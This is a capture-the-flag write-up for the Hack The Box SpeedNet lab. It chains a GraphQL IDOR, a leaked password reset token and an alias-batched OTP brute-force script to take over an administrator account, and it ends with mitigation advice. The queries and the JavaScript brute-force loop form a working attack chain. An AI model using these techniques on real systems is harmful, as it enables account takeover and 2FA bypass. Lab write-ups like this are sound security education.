---
title: SpeedNet [Easy] - Hack The Box
date: 2026-10-01 00:00:00
description: An English write-up for the Hack The Box SpeedNet lab, covering GraphQL, IDOR, password reset, and 2FA.
categories:
  - Web Exploit
  - Writeup CTF
tags:
  - Hack The Box
  - SpeedNet
  - GraphQL
  - IDOR
  - 2FA
  - Web Security
top_img: /img/SpeedNet/00-speednet-htb-banner.png
cover: /img/SpeedNet/00-speednet-htb-banner.png
toc: true
---

# SpeedNet

SpeedNet is an ISP platform. The objective of this lab is to chain several issues in the GraphQL workflow, access the administrator account, and retrieve the hidden flag.

> Environment: Hack The Box. Replace `IP:PORT` with the instance assigned to you.

## 1. Create a test account

First, register a test account using `test@email.htb`. The lab email service is available at:

```text
http://IP:PORT/emails/
```

This is the profile page of the test account during the initial setup. In the screenshot, 2FA is disabled for the test account; the image only illustrates the initial profile interface before testing GraphQL.

<img src="../../../../img/SpeedNet/01-profile-settings.png" alt="SpeedNet Profile Settings for the test account">

After registering and logging in, requests sent by the application can be inspected through Burp Suite.

## 2. Inspect the GraphQL schema with a Burp extension

I used **InQL - GraphQL Scanner**, a Burp Suite extension for testing GraphQL applications. InQL can read the schema through introspection, generate sample queries and mutations, and provide additional features for testing directly in Burp.

In Burp, right-click the request and choose `Extensions -> InQL - GraphQL Scanner -> Generate queries` to generate operations from the application schema.

<img src="../../../../img/SpeedNet/02-inql-extension.png" alt="InQL GraphQL Scanner menu in Burp Suite">

The extension then displays the queries and mutations exposed by the GraphQL endpoint:

<img src="../../../../img/SpeedNet/02-graphql-schema.png" alt="GraphQL queries and mutations displayed in Burp">

The important operations in this attack chain are `userProfile`, `devForgotPassword`, `resetPassword`, `login`, and `verifyTwoFactor`.

## 3. IDOR in the profile query

The profile request uses a `userId` variable. I changed its value to `1`:

```graphql
query GetUserProfile($userId: Int!) {
  userProfile(userId: $userId) {
    id
    email
    firstName
    lastName
    address
    phoneNumber
    twoFactorAuthEnabled
  }
}
```

```json
{
  "userId": 1
}
```

The response returned the administrator's profile, including the email address `admin@speednet.htb`. This is an IDOR because the server does not verify that the requested profile belongs to the current user.

<img src="../../../../img/SpeedNet/01-profile-idor.png" alt="Profile query with userId 1 returning administrator information">

## 4. Obtain a reset token through devForgotPassword

The schema contains the `devForgotPassword` mutation. I called it with the administrator's email address:

```graphql
mutation {
  devForgotPassword(email: "admin@speednet.htb")
}
```

The response returned the password reset token directly.

<img src="../../../../img/SpeedNet/03-dev-forgot-password.png" alt="devForgotPassword returning the reset token directly">

## 5. Reset the administrator password

I used the token with the `resetPassword` mutation and set a new password:

```graphql
mutation {
  resetPassword(
    token: "RESET_TOKEN"
    newPassword: "NEW_PASSWORD"
  )
}
```

After the response confirmed the reset, the administrator email and the new password could be used with the `login` mutation.

<img src="../../../../img/SpeedNet/04-reset-password-success.png" alt="Successful resetPassword response">

## 6. Log in and receive a temporary 2FA token

Because the administrator account has 2FA enabled, the login request does not return the final JWT immediately. Instead, the response has the following format:

```text
2FA_REQUIRED:TEMPORARY_TOKEN
```

`TEMPORARY_TOKEN` is the temporary token used by the `verifyTwoFactor` mutation. The application then redirects to the OTP input page.

<img src="../../../../img/SpeedNet/05-two-factor-page.png" alt="SpeedNet two-factor authentication page">

## 7. Test the OTP with GraphQL aliases

### 7.1 First attempt: use the same field name

At first, I tried calling `verifyTwoFactor` multiple times in the same mutation while keeping the field name unchanged:

```graphql
mutation {
  verifyTwoFactor(token: "TEMPORARY_TOKEN", otp: "1000") { token }
  verifyTwoFactor(token: "TEMPORARY_TOKEN", otp: "1001") { token }
}
```

<img src="../../../../img/SpeedNet/07-otp-same-field-conflict.png" alt="GraphQL field conflict when calling verifyTwoFactor multiple times with the same name">

This does not work because both fields have the same response key, `verifyTwoFactor`, while using different arguments. The GraphQL validator can reject the operation with a field conflict, and the response cannot distinguish the result of each OTP. This is where aliases are needed.

### 7.2 Use GraphQL aliases

A GraphQL alias is a custom response name placed before a field. It allows the same field to be requested multiple times in one operation, with different arguments for each request.

For example, two `verifyTwoFactor` calls can use different aliases:

```graphql
mutation {
  otp1000: verifyTwoFactor(token: "TEMPORARY_TOKEN", otp: "1000") { token }
  otp1001: verifyTwoFactor(token: "TEMPORARY_TOKEN", otp: "1001") { token }
}
```

In the response, `otp1000` and `otp1001` are independent keys. This makes it possible to submit many OTP values in a single GraphQL operation. The alias whose value contains a `token` field identifies the correct OTP.

The following script divides the search space into batches and creates one alias for each OTP. Replace `TOKEN_MOI_SAU_LOGIN` with the temporary token received after login:

```javascript
(async () => {
  const endpoint = location.origin + "/graphql";
  const token = "TOKEN_MOI_SAU_LOGIN";
  const batchSize = 200;

  for (let start = 1000; start <= 999999; start += batchSize) {
    const end = Math.min(start + batchSize - 1, 999999);

    const query = `mutation {
${Array.from({ length: end - start + 1 }, (_, i) => {
  const otp = String(start + i);
  return `otp${otp}: verifyTwoFactor(token:"${token}",otp:"${otp}"){token}`;
}).join("\n")}
}`;

    const response = await fetch(endpoint, {
      method: "POST",
      credentials: "include",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ query })
    });

    const result = await response.json();
    const found = Object.entries(result.data || {})
      .find(([, value]) => value && value.token);

    console.log(`Tried ${start}-${end}`);

    if (found) {
      console.log("OTP FOUND:", found[0].replace("otp", ""));
      console.log("JWT:", found[1].token);
      break;
    }

    await new Promise(resolve => setTimeout(resolve, 1000));
  }
})();
```

<img src="../../../../img/SpeedNet/06-otp-bruteforce-script.png" alt="Script creating GraphQL aliases to test OTP values">

The final result from the instance used in this write-up was:

- Temporary token: starts with `6d2e...`
- Correct OTP: `1628`
- JWT: returned in the output and shown in full in the screenshot.

<img src="../../../../img/SpeedNet/07-admin-otp-jwt.png" alt="OTP 1628 and the corresponding JWT">

The JWT in this output is the token issued after completing 2FA. It can be used for GraphQL requests that require an authenticated administrator session.

## 8. Access the billing endpoint

After completing administrator authentication, access the `/billing` endpoint. The GraphQL request used to read the invoice history is:

```json
{
  "query": "query { invoiceHistory(limit: 10) { id number amount status dueDate } }"
}
```

The `invoiceHistory` response contains the flag in the invoice data, specifically in the `number` field of the matching record.

<img src="../../../../img/SpeedNet/08-billing-flag.png" alt="invoiceHistory response containing the flag in the number field">

## Flag

```text
HTB{gr4phql_3xpl01t_1n_a_nutsh3ll}
```

## Summary

The SpeedNet attack chain was:

1. Use the IDOR to read the administrator profile by changing `userId`.
2. Use `devForgotPassword` to expose a password reset token.
3. Reset the password and log in as the administrator.
4. Use GraphQL aliases to test multiple OTP values in one operation.
5. Use the JWT issued after 2FA to access `/billing` and retrieve the flag.

The application should enforce authorization in each resolver, never return sensitive tokens directly, rate-limit OTP verification, and strictly control the 2FA flow.
